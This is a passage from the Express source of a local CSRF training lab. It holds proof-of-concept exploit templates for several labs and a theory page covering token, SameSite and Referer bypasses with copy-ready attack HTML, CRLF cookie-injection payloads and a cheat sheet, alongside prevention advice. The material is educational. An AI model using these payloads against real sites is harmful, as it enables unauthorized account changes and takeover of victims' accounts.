            7: \`<html>\\n  <body>\\n    <script>\\n      document.location = 'http://localhost:3000/email/change/7?email=attacker@evil.com&_method=POST';\\n    <\\/script>\\n  </body>\\n</html>\`,
            8: \`<html>\\n  <!-- CSRF PoC - Lab 8: Token tied to non-session cookie -->\\n  <body>\\n    <form action="http://localhost:3000/email/change/8" method="POST" id="csrf-form">\\n      <input type="hidden" name="email" value="attacker@evil.com">\\n      <input type="hidden" name="csrf"  value="attacker_csrf_UYjqwyyGyrsnr8qG">\\n    </form>\\n    <img src="http://localhost:3000/lab/csrf-cookie/search?q=x%0d%0aSet-Cookie:%20csrfKey=attacker_csrfKey_xyz789%3b%20SameSite=None"\\n         onerror="document.forms[0].submit()">\\n  </body>\\n</html>\`,
            9: \`<html>\\n  <!-- CSRF PoC - Lab 9: Token duplicated in cookie (Double Submit) -->\\n  <body>\\n    <form action="http://localhost:3000/email/change/9" method="POST" id="csrf-form">\\n      <input type="hidden" name="email" value="attacker@evil.com">\\n      <input type="hidden" name="csrf"  value="hacked">\\n    </form>\\n    <img src="http://localhost:3000/lab/csrf-double/search?q=x%0d%0aSet-Cookie:%20csrf=hacked%3b%20SameSite=None"\\n         onerror="document.forms[0].submit()">\\n  </body>\\n</html>\`
        };
        function setTemplate(n) {
            document.getElementById('payload-text').value = templates[n];
        }
        </script>
    </body>
    </html>
    `);
});

app.post('/exploit/save', (req, res) => {
    savedExploit = req.body.payload || savedExploit;
    res.redirect('/exploit-editor');
});

// ─── Notes / Theory Page ─────────────────────────────────────────────────────

app.get('/notes', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>CSRF Notes — Theory & Bypasses</title>
        <style>
            :root { --primary: #ff6600; --bg: #f4f7f9; }
            * { box-sizing: border-box; }
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background: var(--bg); color: #333; }

            .navbar { background: #1a252f; padding: 15px 50px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; }
            .navbar .logo { color: var(--primary); font-weight: bold; font-size: 20px; text-decoration: none; }
            .navbar .nav-links a { color: white; text-decoration: none; margin-left: 20px; font-size: 14px; font-weight: 500; }
            .navbar .nav-links a:hover { color: var(--primary); }
            .navbar .nav-links a.active { color: var(--primary); border-bottom: 2px solid var(--primary); }

            .hero { background: #232f3e; color: white; padding: 40px 20px; text-align: center; border-bottom: 5px solid var(--primary); }
            .hero h1 { margin: 0; font-size: 32px; }
            .hero p { opacity: 0.75; font-size: 15px; margin-top: 8px; }

            .page-layout { display: flex; max-width: 1300px; margin: 40px auto; gap: 30px; padding: 0 20px; align-items: flex-start; }

            /* Sidebar TOC */
            .toc { width: 260px; background: white; border-radius: 8px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.07); position: sticky; top: 80px; flex-shrink: 0; }
            .toc h3 { margin: 0 0 15px; color: var(--primary); font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
            .toc a { display: block; color: #555; text-decoration: none; padding: 5px 0 5px 10px; font-size: 13px; border-left: 2px solid transparent; line-height: 1.4; }
            .toc a:hover { color: var(--primary); border-left-color: var(--primary); }
            .toc .toc-sub { padding-left: 20px; font-size: 12px; color: #888; }

            /* Content */
            .content { flex: 1; background: white; border-radius: 8px; padding: 40px; box-shadow: 0 4px 15px rgba(0,0,0,0.07); }
            .content h1 { color: var(--primary); font-size: 28px; margin-top: 0; border-bottom: 3px solid #f0f0f0; padding-bottom: 12px; }
            .content h2 { color: #232f3e; font-size: 22px; margin-top: 40px; padding-bottom: 8px; border-bottom: 2px solid #f0f0f0; }
            .content h3 { color: #37475a; font-size: 17px; margin-top: 25px; }
            .content p { line-height: 1.7; color: #444; }
            .content ul, .content ol { line-height: 1.8; color: #444; padding-left: 20px; }
            .content li { margin-bottom: 4px; }

            code { background: #f0f0f0; padding: 2px 6px; border-radius: 3px; font-family: 'Consolas', monospace; font-size: 13px; color: #c0392b; }
            pre { background: #282c34; color: #abb2bf; padding: 18px; border-radius: 6px; overflow-x: auto; font-size: 13px; line-height: 1.6; margin: 16px 0; }
            pre code { background: none; color: inherit; padding: 0; font-size: inherit; }

            /* Callout boxes */
            .callout { padding: 14px 18px; border-radius: 6px; margin: 16px 0; font-size: 14px; line-height: 1.6; }
            .callout-info { background: #e7f3ff; border-left: 4px solid #2196f3; }
            .callout-warn { background: #fff8e1; border-left: 4px solid #ff9800; }
            .callout-danger { background: #fde8e8; border-left: 4px solid #e53935; }
            .callout-success { background: #e8f5e9; border-left: 4px solid #43a047; }

            /* Tables */
            table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 14px; }
            th { background: #232f3e; color: white; padding: 10px 14px; text-align: left; }
            td { padding: 9px 14px; border-bottom: 1px solid #eee; }
            tr:hover td { background: #f9f9f9; }

            /* Bypass cards */
            .bypass-card { border: 1px solid #e0e0e0; border-radius: 8px; margin: 20px 0; overflow: hidden; }
            .bypass-card-header { background: #37475a; color: white; padding: 12px 18px; display: flex; align-items: center; gap: 12px; }
            .bypass-card-header .num { background: var(--primary); color: white; width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 13px; flex-shrink: 0; }
            .bypass-card-header .title { font-weight: bold; font-size: 15px; }
            .bypass-card-header .lab-link { margin-left: auto; background: var(--primary); color: white; padding: 4px 12px; border-radius: 4px; text-decoration: none; font-size: 12px; font-weight: bold; }
            .bypass-card-body { padding: 18px; }
            .bypass-card-body p { margin-top: 0; }

            .tag-vuln { display: inline-block; background: #fde8e8; color: #c0392b; padding: 2px 8px; border-radius: 3px; font-size: 12px; font-weight: bold; margin-bottom: 8px; }
            .tag-exploit { display: inline-block; background: #e8f5e9; color: #27ae60; padding: 2px 8px; border-radius: 3px; font-size: 12px; font-weight: bold; margin-bottom: 8px; margin-left: 6px; }

            hr { border: none; border-top: 2px solid #f0f0f0; margin: 35px 0; }

            .badge-apprentice { background: #e8f5e9; color: #28a745; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
            .badge-practitioner { background: #fffde7; color: #856404; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
        </style>
    </head>
    <body>

    <div class="navbar">
        <a href="/" class="logo">CSRF MASTER</a>
        <div class="nav-links">
            <a href="/">All Labs</a>
            <a href="/exploit-editor">Exploit Server</a>
            <a href="/notes" class="active">Notes</a>
        </div>
    </div>

    <div class="hero">
        <h1>Cross-Site Request Forgery (CSRF)</h1>
        <p>Complete theory — concepts, defenses, and every major bypass technique.</p>
    </div>

    <div class="page-layout">

        <!-- Sidebar TOC -->
        <div class="toc">
            <h3>Contents</h3>
            <a href="#what-is-csrf">1. What is CSRF?</a>
            <a href="#how-it-works">2. How It Works</a>
            <a href="#three-conditions">3. Three Conditions</a>
            <a href="#constructing">4. Constructing an Attack</a>
            <a href="#csrf-tokens">5. CSRF Tokens</a>
            <a href="#token-bypasses">6. Bypassing Token Validation</a>
            <a class="toc-sub" href="#bypass-1">→ Method Bypass</a>
            <a class="toc-sub" href="#bypass-2">→ Token Absent</a>
            <a class="toc-sub" href="#bypass-3">→ Not Session-Tied</a>
            <a class="toc-sub" href="#bypass-4">→ Non-Session Cookie</a>
            <a class="toc-sub" href="#bypass-5">→ Double Submit</a>
            <a href="#samesite">7. SameSite Cookies</a>
            <a href="#samesite-bypasses">8. SameSite Bypasses</a>
            <a class="toc-sub" href="#ss-bypass-1">→ GET Request</a>
            <a class="toc-sub" href="#ss-bypass-2">→ On-Site Gadgets</a>
            <a class="toc-sub" href="#ss-bypass-3">→ Sibling Domain</a>
            <a class="toc-sub" href="#ss-bypass-4">→ Grace Period</a>
            <a href="#referer">9. Referer Defenses</a>
            <a href="#referer-bypasses">10. Referer Bypasses</a>
            <a href="#prevention">11. Prevention</a>
            <a href="#cheatsheet">12. Quick Reference</a>
        </div>

        <!-- Main Content -->
        <div class="content">

            <h1>CSRF — Complete Notes</h1>

            <!-- ── 1. WHAT IS CSRF ── -->
            <h2 id="what-is-csrf">1. What is CSRF?</h2>
            <p><strong>Cross-Site Request Forgery (CSRF)</strong> is a web security vulnerability that tricks authenticated users into unknowingly submitting requests to a web application they are currently logged into.</p>
            <p>The attacker exploits the fact that browsers <strong>automatically include cookies</strong> (including session tokens) with every request — even cross-site ones. The application cannot tell the difference between a legitimate user action and a forged one.</p>

            <h3>Impact</h3>
            <ul>
                <li>Change a victim's <strong>email address</strong> or <strong>password</strong></li>
                <li><strong>Transfer funds</strong> from a banking application</li>
                <li>Alter <strong>account permissions</strong> or roles</li>
                <li>Perform any state-changing action the victim is authorized to do</li>
            </ul>

            <div class="callout callout-info">
                <strong>CSRF vs XSS:</strong> CSRF exploits the <em>trust a site has in the user's browser</em>. XSS exploits the <em>trust a user has in a website</em>. CSRF does not steal data — it performs unauthorized actions using the victim's existing session.
            </div>

            <hr>

            <!-- ── 2. HOW IT WORKS ── -->
            <h2 id="how-it-works">2. How CSRF Works</h2>
            <h3>Step-by-step attack flow</h3>
            <ol>
                <li>Victim logs into <code>bank.com</code> → session cookie is set in browser</li>
                <li>Victim visits attacker's page (<code>evil.com</code>)</li>
                <li><code>evil.com</code> contains a hidden auto-submitting form targeting <code>bank.com</code></li>
                <li>Browser sends the POST to <code>bank.com</code> — <strong>with the session cookie attached automatically</strong></li>
                <li><code>bank.com</code> processes the request as if the victim initiated it</li>
            </ol>
            <p>The victim never clicks anything visible. The page loads and the attack fires silently.</p>

            <h3>Why the browser cooperates</h3>
            <p>The <strong>Same-Origin Policy (SOP)</strong> restricts cross-site <em>reads</em> (JavaScript cannot read cross-site responses). But SOP does <strong>not</strong> restrict cross-site <em>writes</em> — browsers will send cross-site form submissions including cookies.</p>

            <hr>

            <!-- ── 3. THREE CONDITIONS ── -->
            <h2 id="three-conditions">3. Three Conditions for Vulnerability</h2>
            <p>All three must be present:</p>
            <table>
                <tr><th>Condition</th><th>Description</th></tr>
                <tr><td><strong>Relevant action</strong></td><td>A state-changing function exists that the attacker wants to trigger (change email, transfer funds, etc.)</td></tr>
                <tr><td><strong>Cookie-only session</strong></td><td>The application identifies users solely via session cookies with no additional per-request mechanism</td></tr>
                <tr><td><strong>Predictable parameters</strong></td><td>All request parameters can be determined or guessed by the attacker — no secret value they cannot obtain</td></tr>
            </table>

            <div class="callout callout-warn">
                <strong>Example:</strong> A password change form requiring only <code>new_password</code> is exploitable. If it also requires <code>current_password</code>, CSRF is blocked — the attacker cannot know the victim's current password.
            </div>

            <hr>

            <!-- ── 4. CONSTRUCTING AN ATTACK ── -->
            <h2 id="constructing">4. Constructing a CSRF Attack</h2>
            <h3>Basic POST-based CSRF</h3>
<pre><code>&lt;!-- Hosted on evil.com --&gt;
&lt;html&gt;
  &lt;body&gt;
    &lt;form action="https://vulnerable-website.com/email/change" method="POST"&gt;
      &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
    &lt;/form&gt;
    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>

            <h3>GET-based CSRF (even simpler)</h3>
<pre><code>&lt;!-- If the action is accessible via GET --&gt;
&lt;img src="https://vulnerable-website.com/email/change?email=attacker@evil.com"&gt;

&lt;!-- Or using navigation --&gt;
&lt;script&gt;document.location = 'https://vulnerable-website.com/email/change?email=attacker@evil.com';&lt;/script&gt;</code></pre>

            <h3>Delivery</h3>
            <ul>
                <li>Host the exploit on an attacker-controlled website</li>
                <li>Send link via phishing email or social media</li>
                <li>Embed in a comment on a popular website</li>
            </ul>

            <hr>

            <!-- ── 5. CSRF TOKENS ── -->
            <h2 id="csrf-tokens">5. CSRF Tokens</h2>
            <p>A <strong>CSRF token</strong> is a secret, unpredictable value that the server generates per session (or per request), embeds in forms, and validates on every state-changing request.</p>

<pre><code>&lt;form action="/email/change" method="POST"&gt;
  &lt;input type="hidden" name="csrf" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz"&gt;
  &lt;input type="email" name="email"&gt;
  &lt;button type="submit"&gt;Update&lt;/button&gt;
&lt;/form&gt;</code></pre>

            <p><strong>Why tokens work:</strong> The attacker's page on <code>evil.com</code> cannot read the CSRF token from the vulnerable site — that would violate the Same-Origin Policy. So a forged request cannot include a valid token.</p>

            <table>
                <tr><th>Transmission Method</th><th>Notes</th></tr>
                <tr><td>Hidden form field</td><td>Most common. Token sent as POST body parameter.</td></tr>
                <tr><td>Custom request header</td><td>Used with AJAX (<code>X-CSRF-Token</code>). Browsers block cross-origin custom headers.</td></tr>
                <tr><td>URL parameter</td><td>Avoid — tokens leak into browser history and server logs.</td></tr>
            </table>

            <hr>

            <!-- ── 6. TOKEN BYPASSES ── -->
            <h2 id="token-bypasses">6. Bypassing CSRF Token Validation</h2>
            <p>Even when a CSRF token exists, flawed validation logic can make it bypassable.</p>

            <!-- Bypass 1 -->
            <div class="bypass-card" id="bypass-1">
                <div class="bypass-card-header">
                    <div class="num">1</div>
                    <div class="title">Validation depends on request method</div>
                    <a href="/lab/token-method" class="lab-link">Lab 2 →</a>
                </div>
                <div class="bypass-card-body">
                    <span class="tag-vuln">Vulnerability</span><span class="tag-exploit">Exploit</span>
                    <p>The server validates the CSRF token for <code>POST</code> requests but <strong>skips validation entirely for <code>GET</code></strong> requests.</p>
                    <p><strong>Fix:</strong> Change the form method to GET, or use <code>document.location</code>:</p>
<pre><code>&lt;script&gt;
  document.location = 'https://vulnerable-website.com/email/change?email=attacker@evil.com';
&lt;/script&gt;</code></pre>
                    <p><strong>Root cause:</strong> Developers added token checks only to POST handling code.</p>
                </div>
            </div>

            <!-- Bypass 2 -->
            <div class="bypass-card" id="bypass-2">
                <div class="bypass-card-header">
                    <div class="num">2</div>
                    <div class="title">Validation skipped when token is absent</div>
                    <a href="/lab/token-present" class="lab-link">Lab 3 →</a>
                </div>
                <div class="bypass-card-body">
                    <span class="tag-vuln">Vulnerability</span><span class="tag-exploit">Exploit</span>
                    <p>The server validates the token <strong>only if the <code>csrf</code> parameter is present</strong>. If the parameter is missing entirely, validation is skipped.</p>
                    <p><strong>Exploit:</strong> Remove the <code>csrf</code> parameter entirely from the forged request (not empty — absent):</p>
<pre><code>&lt;form action="/email/change" method="POST"&gt;
  &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
  &lt;!-- No csrf field at all --&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
                    <p><strong>Root cause:</strong> Logic is <code>if (token_present) { validate(); }</code> instead of <code>if (!token_valid) { reject(); }</code></p>
                </div>
            </div>

            <!-- Bypass 3 -->
            <div class="bypass-card" id="bypass-3">
                <div class="bypass-card-header">
                    <div class="num">3</div>
                    <div class="title">Token not tied to user session</div>
                    <a href="/lab/token-session" class="lab-link">Lab 4 →</a>
                </div>
                <div class="bypass-card-body">
                    <span class="tag-vuln">Vulnerability</span><span class="tag-exploit">Exploit</span>
                    <p>The server maintains a <strong>global pool of valid tokens</strong> and checks the submitted token is in the pool — but does not verify it belongs to the current session.</p>
                    <p><strong>Exploit:</strong> Log in as the attacker, capture a valid token, then use it in a forged request targeting the victim:</p>
<pre><code>&lt;form action="/email/change" method="POST"&gt;
  &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
  &lt;input type="hidden" name="csrf" value="ATTACKER_VALID_TOKEN"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
                    <p><strong>Root cause:</strong> Token pool is shared across all sessions. Tokens must be bound to the specific session that generated them.</p>
                </div>
            </div>

            <!-- Bypass 4 -->
            <div class="bypass-card" id="bypass-4">
                <div class="bypass-card-header">
                    <div class="num">4</div>
                    <div class="title">Token tied to a non-session cookie</div>
                </div>
                <div class="bypass-card-body">
                    <span class="tag-vuln">Vulnerability</span>
                    <p>The CSRF token is tied to a separate cookie (<code>csrfKey</code>) rather than the session cookie. If the attacker can set cookies in the victim's browser (via a cookie-injection point), they can plant their own <code>csrfKey</code> + matching token.</p>
<pre><code>&lt;!-- Step 1: inject csrfKey cookie via header injection --&gt;
&lt;img src="https://vulnerable-website.com/search?q=x;%0d%0aSet-Cookie:%20csrfKey=ATTACKER_KEY"&gt;

&lt;!-- Step 2: forged form with matching token --&gt;
&lt;form action="/email/change" method="POST"&gt;
  &lt;input name="email" value="attacker@evil.com"&gt;
  &lt;input name="csrf" value="TOKEN_MATCHING_ATTACKER_KEY"&gt;
&lt;/form&gt;</code></pre>
                    <p><strong>Root cause:</strong> Validation only checks that token matches the <code>csrfKey</code> cookie — not the session.</p>
                </div>
            </div>

            <!-- Bypass 5 -->
            <div class="bypass-card" id="bypass-5">
                <div class="bypass-card-header">
                    <div class="num">5</div>
                    <div class="title">CSRF token duplicated in cookie (Double Submit)</div>
                </div>
                <div class="bypass-card-body">
                    <span class="tag-vuln">Vulnerability</span>
                    <p>The server sets a random value as both a cookie and expects it as a form parameter — just checks they match with no server-side state. If the attacker can set cookies, they control both sides.</p>
<pre><code>&lt;!-- Set csrfToken cookie to attacker-chosen value --&gt;
&lt;img src="https://vulnerable-website.com/any-endpoint?x=x;%0d%0aSet-Cookie:%20csrfToken=attacker123"&gt;

&lt;!-- Forged form with matching value --&gt;
&lt;form action="/email/change" method="POST"&gt;
  &lt;input name="email" value="attacker@evil.com"&gt;
  &lt;input name="csrf" value="attacker123"&gt;
&lt;/form&gt;</code></pre>
                    <p><strong>Root cause:</strong> Stateless double-submit is only secure if the attacker cannot control the cookie domain.</p>
                </div>
            </div>

            <hr>

            <!-- ── 7. SAMESITE ── -->
            <h2 id="samesite">7. SameSite Cookies</h2>
            <p><strong>SameSite</strong> is a cookie attribute controlling whether a browser sends a cookie with cross-site requests.</p>

            <table>
                <tr><th>Value</th><th>Behavior</th><th>CSRF Protection</th></tr>
                <tr><td><code>Strict</code></td><td>Cookie never sent on cross-site requests</td><td>Strong — blocks all cross-site requests</td></tr>
                <tr><td><code>Lax</code></td><td>Cookie sent on cross-site <strong>top-level navigation GET</strong> only</td><td>Moderate — blocks POST-based CSRF</td></tr>
                <tr><td><code>None</code></td><td>Always sent (requires <code>Secure</code>)</td><td>None</td></tr>
            </table>

<pre><code>Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
Set-Cookie: session=abc123; SameSite=Lax;    Secure; HttpOnly
Set-Cookie: session=abc123; SameSite=None;   Secure; HttpOnly</code></pre>

            <div class="callout callout-info">
                <strong>Chrome default (since 2021):</strong> Cookies without an explicit SameSite attribute are treated as <code>SameSite=Lax</code>. Cross-site POST is blocked; cross-site top-level GET is allowed.
            </div>

            <div class="callout callout-warn">
                <strong>Site ≠ Origin:</strong> A <em>site</em> is scheme + TLD+1 (e.g. <code>portswigger.net</code>). An <em>origin</em> is scheme + hostname + port. Two subdomains are <strong>same-site but cross-origin</strong>. SameSite restrictions apply at the site level.
            </div>

            <hr>

            <!-- ── 8. SAMESITE BYPASSES ── -->
            <h2 id="samesite-bypasses">8. Bypassing SameSite Restrictions</h2>

            <!-- SS Bypass 1 -->
            <div class="bypass-card" id="ss-bypass-1">
                <div class="bypass-card-header">
                    <div class="num">1</div>
                    <div class="title">GET request for state changes (Lax bypass)</div>
                    <a href="/lab/samesite-lax" class="lab-link">Lab 5 →</a>
                </div>
                <div class="bypass-card-body">
                    <p>Lax cookies are included in cross-site <strong>top-level navigation GET</strong> requests. If the vulnerable endpoint accepts GET for state changes, CSRF works despite Lax.</p>
<pre><code>&lt;!-- Top-level navigation — Lax cookie IS included --&gt;
&lt;script&gt;
  document.location = 'https://vulnerable-website.com/email/change?email=attacker@evil.com';
&lt;/script&gt;

&lt;!-- Some frameworks support method override via GET param --&gt;
&lt;script&gt;
  document.location = 'https://vulnerable-website.com/email/change?_method=POST&amp;email=attacker@evil.com';
&lt;/script&gt;</code></pre>
                </div>
            </div>

            <!-- SS Bypass 2 -->
            <div class="bypass-card" id="ss-bypass-2">
                <div class="bypass-card-header">
                    <div class="num">2</div>
                    <div class="title">On-site gadgets (Strict bypass)</div>
                </div>
                <div class="bypass-card-body">
                    <p>Even <code>SameSite=Strict</code> can be bypassed using a <strong>client-side redirect gadget</strong> on the target site. The first hop is cross-site (no cookie), but the redirect creates a same-site secondary request (cookie included).</p>
<pre><code>&lt;!-- Exploit flow --&gt;
evil.com → open-redirect on vulnerable-website.com?url=/email/change?email=x
           [cross-site, no cookie]  →  [same-site, cookie sent!]</code></pre>
                    <p><strong>Note:</strong> Server-side redirects do NOT work — browsers track the original cross-site origin through them.</p>
                </div>
            </div>

            <!-- SS Bypass 3 -->
            <div class="bypass-card" id="ss-bypass-3">
                <div class="bypass-card-header">
                    <div class="num">3</div>
                    <div class="title">Vulnerable sibling domain</div>
                </div>
                <div class="bypass-card-body">
                    <p>If any subdomain of the target site has XSS, you can make requests that are <strong>same-site</strong> from the victim's perspective — bypassing all SameSite restrictions completely.</p>
<pre><code>&lt;!-- Running on cms.vulnerable-website.com (same site!) --&gt;
fetch('https://vulnerable-website.com/email/change', {
  method: 'POST',
  credentials: 'include',
  body: 'email=attacker@evil.com'
});</code></pre>
                </div>
            </div>

            <!-- SS Bypass 4 -->
            <div class="bypass-card" id="ss-bypass-4">
                <div class="bypass-card-header">
                    <div class="num">4</div>
                    <div class="title">Newly issued cookies — 120-second grace period</div>
                </div>
                <div class="bypass-card-body">
                    <p>Chrome gives cookies without an explicit SameSite attribute a <strong>120-second window</strong> after issuance where they behave like <code>SameSite=None</code>. Force a cookie refresh (e.g., OAuth flow), then fire CSRF within the grace period.</p>
<pre><code>&lt;script&gt;
  // Step 1: force fresh cookie via popup
  window.open('https://vulnerable-website.com/oauth-login');

  // Step 2: fire CSRF while cookie is in grace period
  setTimeout(() =&gt; {
    window.open('https://vulnerable-website.com/email/change?email=attacker@evil.com');
  }, 5000);
&lt;/script&gt;</code></pre>
                </div>
            </div>

            <hr>

            <!-- ── 9. REFERER DEFENSES ── -->
            <h2 id="referer">9. Referer-Based Defenses</h2>
            <p>Some applications validate the HTTP <code>Referer</code> header to confirm the request came from their own domain.</p>
<pre><code>POST /email/change HTTP/1.1
Host: vulnerable-website.com
Referer: https://vulnerable-website.com/my-account   ← validated
Cookie: session=abc123

email=attacker@evil.com</code></pre>
            <div class="callout callout-warn">
                Referer-based validation is generally <strong>weaker than CSRF tokens</strong>. Browsers may suppress the Referer header in privacy mode, via HTTPS→HTTP transitions, and via meta tags. Always use CSRF tokens as the primary defense.
            </div>

            <hr>

            <!-- ── 10. REFERER BYPASSES ── -->
            <h2 id="referer-bypasses">10. Bypassing Referer Validation</h2>

            <!-- Referer Bypass 1 -->
            <div class="bypass-card" id="referer-bypass-1">
                <div class="bypass-card-header">
                    <div class="num">1</div>
                    <div class="title">Omit the Referer header entirely</div>
                    <a href="/lab/referer-bypass" class="lab-link">Lab 6 →</a>
                </div>
                <div class="bypass-card-body">
                    <p>If the server only validates the Referer <strong>when it is present</strong>, suppress it using a meta tag:</p>
<pre><code>&lt;html&gt;
  &lt;head&gt;
    &lt;meta name="referrer" content="never"&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;form action="https://vulnerable-website.com/email/change" method="POST"&gt;
      &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
    &lt;/form&gt;
    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
                    <p>The server receives the POST with no <code>Referer</code> header and skips validation.</p>
                </div>
            </div>

            <!-- Referer Bypass 2 -->
            <div class="bypass-card" id="referer-bypass-2">
                <div class="bypass-card-header">
                    <div class="num">2</div>
                    <div class="title">Subdomain placement (starts-with check)</div>
                </div>
                <div class="bypass-card-body">
                    <p>If validation checks the Referer <em>starts with</em> the expected domain, host the exploit at:</p>
<pre><code>https://vulnerable-website.com.evil.com/csrf-attack
&lt;!-- Referer starts with "vulnerable-website.com" — check passes! --&gt;</code></pre>
                </div>
            </div>

            <!-- Referer Bypass 3 -->
            <div class="bypass-card" id="referer-bypass-3">
                <div class="bypass-card-header">
                    <div class="num">3</div>
                    <div class="title">Domain in query string (contains check)</div>
                </div>
                <div class="bypass-card-body">
                    <p>If validation checks the Referer <em>contains</em> the target domain anywhere:</p>
<pre><code>https://evil.com/csrf-attack?vulnerable-website.com
&lt;!-- Referer contains "vulnerable-website.com" — check passes! --&gt;</code></pre>
                    <div class="callout callout-warn">Modern browsers strip query strings from Referer by default. Add this to your exploit server response to force full URL transmission:<br><code>Referrer-Policy: unsafe-url</code></div>
                </div>
            </div>

            <hr>

            <!-- ── 11. PREVENTION ── -->
            <h2 id="prevention">11. Prevention Checklist</h2>
            <table>
                <tr><th>Defense</th><th>Implementation</th><th>Strength</th></tr>
                <tr><td><strong>CSRF Tokens</strong></td><td>Server-generated, session-tied, validated on every state-changing request</td><td>Strong ✅</td></tr>
                <tr><td><strong>SameSite=Strict</strong></td><td><code>Set-Cookie: session=...; SameSite=Strict</code></td><td>Strong ✅</td></tr>
                <tr><td><strong>SameSite=Lax</strong></td><td>Chrome default; blocks cross-site POST CSRF</td><td>Moderate ⚠️</td></tr>
                <tr><td><strong>Referer Validation</strong></td><td>Validate on every request AND reject when header is absent</td><td>Moderate ⚠️</td></tr>
                <tr><td><strong>Custom Headers</strong></td><td>Require <code>X-Requested-With: XMLHttpRequest</code> for AJAX</td><td>Moderate ⚠️</td></tr>
                <tr><td><strong>Re-authentication</strong></td><td>Require current password for email/password changes</td><td>Strong ✅</td></tr>
                <tr><td><strong>User interaction</strong></td><td>CAPTCHA or confirmation before irreversible actions</td><td>Strong ✅</td></tr>
            </table>

            <div class="callout callout-success">
                <strong>Recommended minimum:</strong> CSRF Token (per-session or per-request) + <code>SameSite=Lax</code> or <code>Strict</code>. Defense in depth is best — combine multiple layers.
            </div>

            <hr>

            <!-- ── 12. QUICK REFERENCE ── -->
            <h2 id="cheatsheet">12. Quick Reference — Attack Templates</h2>

            <h3>Basic POST CSRF</h3>
<pre><code>&lt;form id="f" action="TARGET_URL" method="POST"&gt;
  &lt;input name="PARAM" value="VALUE"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;</code></pre>

            <h3>GET-based CSRF</h3>
<pre><code>&lt;script&gt;document.location = 'TARGET_URL?PARAM=VALUE';&lt;/script&gt;</code></pre>

            <h3>Drop the Referer header</h3>
<pre><code>&lt;head&gt;&lt;meta name="referrer" content="never"&gt;&lt;/head&gt;
&lt;form action="TARGET_URL" method="POST"&gt;...&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>

            <h3>Labs at a Glance</h3>
            <table>
                <tr><th>#</th><th>Lab</th><th>Difficulty</th><th>Key Technique</th></tr>
                <tr><td>1</td><td><a href="/lab/no-defenses">No defenses</a></td><td><span class="badge-apprentice">APPRENTICE</span></td><td>Auto-submit POST form</td></tr>
                <tr><td>2</td><td><a href="/lab/token-method">Token method bypass</a></td><td><span class="badge-practitioner">PRACTITIONER</span></td><td>Switch POST → GET</td></tr>
                <tr><td>3</td><td><a href="/lab/token-present">Token absent bypass</a></td><td><span class="badge-practitioner">PRACTITIONER</span></td><td>Remove <code>csrf</code> param entirely</td></tr>
                <tr><td>4</td><td><a href="/lab/token-session">Token not session-tied</a></td><td><span class="badge-practitioner">PRACTITIONER</span></td><td>Use attacker's own valid token</td></tr>
                <tr><td>5</td><td><a href="/lab/samesite-lax">SameSite Lax + GET</a></td><td><span class="badge-practitioner">PRACTITIONER</span></td><td><code>document.location</code> navigation</td></tr>
                <tr><td>6</td><td><a href="/lab/referer-bypass">Referer bypass</a></td><td><span class="badge-practitioner">PRACTITIONER</span></td><td><code>&lt;meta name="referrer" content="never"&gt;</code></td></tr>
                <tr><td>7</td><td><a href="/lab/method-override">SameSite Lax Override</a></td><td><span class="badge-practitioner">PRACTITIONER</span></td><td>GET with <code>_method=POST</code> override</td></tr>
                <tr><td>8</td><td><a href="/lab/csrf-cookie">Token tied to cookie</a></td><td><span class="badge-practitioner">PRACTITIONER</span></td><td>Inject <code>csrfKey</code> via CRLF search</td></tr>
                <tr><td>9</td><td><a href="/lab/csrf-double">Double Submit cookie</a></td><td><span class="badge-practitioner">PRACTITIONER</span></td><td>Inject <code>csrf</code> via CRLF search</td></tr>
            </table>

        </div><!-- /content -->
    </div><!-- /page-layout -->

    </body>
    </html>
    `);
});

// ─── Start ───────────────────────────────────────────────────────────────────

app.listen(port, () => {
    console.log(`CSRF Labs running at http://localhost:${port}`);
});
